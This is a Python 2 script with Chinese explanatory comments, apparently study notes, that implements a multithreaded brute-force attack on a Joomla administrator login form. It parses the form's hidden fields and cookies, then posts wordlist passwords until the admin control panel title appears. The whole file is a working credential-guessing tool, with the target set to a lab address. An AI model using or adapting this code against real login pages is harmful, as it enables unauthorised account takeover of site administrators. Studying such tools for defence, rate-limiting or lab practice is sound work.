#-*- coding:utf8 -*-
#暴力破解HTML表格认证
"""
流程：
1.检索登录页面，接受所有返回的cookies值
2.从HTML中获取所有表单元素
3.在你的字典中设置需要猜测的用户名和密码
4.发送HTTP POST数据包到登录处理脚本，数据包含所有的HTML表单文件和存储的cookies值
5.测试是否能成功登录Web应用


"""
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

#简要设置
user_thread = 10
username ="giantbranch"
wordlist_file ="./mydict.txt"
resume = None

#特点目标设置
target_url = "http://192.168.1.105/Joomla/administrator/index.php"#脚本首先下载和解析的HTML页面。
target_post = "http://192.168.1.105/Joomla/administrator/index.php"#表示将要尝试暴力破解的位置

username_field = "username"#这两个变量为对应的HTML元素的名字
password_field = "passwd"

#登陆成功后，title里面就有下面的文字，注意是语言是英文才是下面的哦　
success_check = "Administration - Control Panel"#检验每一次暴力提交的用户名和密码是否成功登录

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}#创建字典用来存储结果

    #当我们调用feed函数时，他将整个HTML文档传递进来并在遇到每个标签时调用下面这个函数(根据函数名就容易理解)
    #寻找HTML中的input标签
    def handle_starttag(self, tag, attrs):
        #判断是否是input标签
        if tag == "input":
            tag_name = None
            tag_value = None
            for name,value in attrs:#遍历每一个标签的属性，当找到用户名或者参数值属性时，将它存储在tag_results字典中
                #input标签里面不是有name,value,type等属性吗，这里只判断name和value
                #不过我觉得第二个if是多余的
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
                if tag_name is not None:
                    self.tag_results[tag_name] = value
                #在HTML处理之后，我们的暴力破解类可以替换页面中的用户名和密码域值，同时让其他部分保持不变

                """
                当使用HTMLParser类时，有三种主要的方法：handle_starttag,handle_endtag和handle_data.
                函数原型：
                    handle_starttag(self,tag,attributes)
                    handle_endtag(self,tag)
                    handle_data(self,data)
                示例：
                <title>Python</title>
                
                handle_starttag :title
                handle_endtag   :title
                handle_data     :Python
                """
class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for %s" % username)

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            #从字典获取密码，并去除右边的空格
            brute = self.password_q.get().rstrip()
            #使用FileCookieJar类，将cookie值储存到文件，参数为文件名，可用于存取cookie
            jar = cookielib.FileCookieJar("cookies")
            #用上面的jar初始化urllib2打开器,这样下面请求url时，就会把cookie值存到那个文件中
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response =opener.open(target_url)

            page = response.read()

            print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))

            #解析隐藏区域(表单)
            """
            启动初始化请求，去获取登录表单，当获取所有的原始HTML代码之后，将获取的代码传递给HTML页面解析器
            并调用feed方法
            
            """
            parser = BruteParser()
            parser.feed(page)

            #已经含有隐藏表单的键值
            post_tags = parser.tag_results
            """
            返回一个由所有已获取表单元素组成的字典。
            成功解析HTML后，用暴力破解工具替换用户名和密码部分
            """
            #添加我们的用户名和密码区域
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            #输出post的数据(键值)
            # for key,value in post_tags.items():
            #     print key,':',value

            #url编码post的数据，开始尝试登陆
            login_data = urllib.urlencode(post_tags)
            login_response =opener.open(target_post, login_data)
            login_result = login_response.read()


            if success_check in login_result:#　判断是否登陆成功
                #设置为True，让循环结束
                self.found = True

                print ("[*] Bruteforce successful.")
                print ("[*] Username: %s" % username)
                print ("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")

def built_wordlist(wordlist_file):
    #读入字典文件
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        #删除字符串末尾的空格
        word  = word.rstrip()
        #如果是延续上一次
        if resume is not None:

            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: %s" % resume)
        else:
            words.put(word)
    return words

#构造字典
words = built_wordlist(wordlist_file)

#初始化Bruter类
bruter_obj = Bruter(username, words)
#调用run_bruteforce函数
bruter_obj.run_bruteforce()